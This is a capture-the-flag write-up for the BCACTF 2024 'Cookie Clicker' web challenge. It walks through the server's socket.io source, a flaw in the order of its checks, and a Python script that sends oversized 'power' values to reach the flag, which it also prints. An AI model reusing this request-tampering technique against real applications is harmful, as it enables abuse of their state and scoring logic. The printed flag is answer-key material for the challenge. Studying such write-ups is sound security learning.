---
layout: writeup
category: BCACTF
chall_description: 
points: 100
solves: 115
tags: web BCACTF
date: 2024-06-11
comments: false
---


## Description
This one was a decent challenge. After wasting hours on writing socketio code in python to manually test it I realized it had race condition, in any case it was fun. Now let's dive into it.


## Enumeration
This challenge was written in node js and provided source code for it. 

```js
io.on('connection', (socket) => {
    sessions[socket.id] = 0
    errors[socket.id] = 0

    socket.on('disconnect', () => {
        console.log('user disconnected');
    });

    socket.on('chat message', (msg) => {
        socket.emit('chat message', msg);
    });

    socket.on('receivedError', (msg) => {
        sessions[socket.id] = errors[socket.id]
        socket.emit('recievedScore', JSON.stringify({"value":sessions[socket.id]}));
    });

    socket.on('click', (msg) => { 
        let json = JSON.parse(msg)
        if (sessions[socket.id] > 1e20) {
            socket.emit('recievedScore', JSON.stringify({"value":"FLAG"}));
            return;
        }
        ...
        ...
    });
});
```


It uses `socket-io` to interact with the user and manages sessions based on socketid. Socket has deafault on connection and on disconnect function, it also has a chat message option probably for debugging purposes. For the main logic part, two functions click and recievedError are present.

### on click
On click function is triggered when cookie is clicked on the clients end and updates the cookie value based on `newValue = Math.floor(Math.random() * json.power) + 1 + oldValue`. The value of power cannot be greater than 10. It emits recievedScore or error based on checks and If cookie value is greater than 1e20 it returns the flag.

## Solution


```js
    socket.on('click', (msg) => {
        let json = JSON.parse(msg)

        if (sessions[socket.id] > 1e20) {
            socket.emit('recievedScore', JSON.stringify({"value":"FLAG"}));
            return;
        }

        if (json.value != sessions[socket.id]) {
            socket.emit("error", "previous value does not match")
        }

        let oldValue = sessions[socket.id]
        let newValue = Math.floor(Math.random() * json.power) + 1 + oldValue

        sessions[socket.id] = newValue
        socket.emit('recievedScore', JSON.stringify({"value":newValue}));

        if (json.power > 10) {
            socket.emit('error', JSON.stringify({"value":oldValue}));
        }

        errors[socket.id] = oldValue;
    });
```

If you notice `sessions[socket.id] = newValue`, cookie value is stored in global sessions then if power is greater than 10 it emits error and on the client-side js is error is recieved it sends receivedError to server which basically resets the cookie back to `oldvalue`.  

Another thing is that on click function first checks for cookie value to return the flag then performs the checks to emits error.

Based on above two points if we send two requests with power `1e21` we will get the flag. I wrote then following script to connectto the socket-io using python. 


```python
import json
import socketio
 
#sio = socketio.SimpleClient(logger=True, engineio_logger=True)
sio = socketio.SimpleClient()
sio.connect("http://challs.bcactf.com:31386/socket-io") 

sio.emit('chat message', "Hello World!")
event = sio.receive()
print(f'Test Event Recieved: "{event[0]}" with arguments {event[1:]}')
 
sid_value = 0 
power = 1e21
while True:
    sio.emit('click', json.dumps({"power":power, "value":sid_value}) )
    event = sio.receive()
    flag = json.loads(event[1:][0])["value"]   
    print(f'Click Response: "{event[0]}" with {event[1:][0]} | Current Sid Value: {sid_value}') 

    try:
        if flag.startswith("bcactf"):
            print(f"Flag: {flag}")
            exit()
    except AttributeError:
        pass
```
[Github Link](https://github.com/Harshad07/CTF-Solutions/blob/main/2024/BCACTF/Cookie%20Clicker/solve.py)


![Branching](/assets/CTFs/BCACTF/cookie-clicker.jpg)


`bcactf{H0w_Did_Y0u_Cl1ck_S0_M4ny_T1mes_123}`

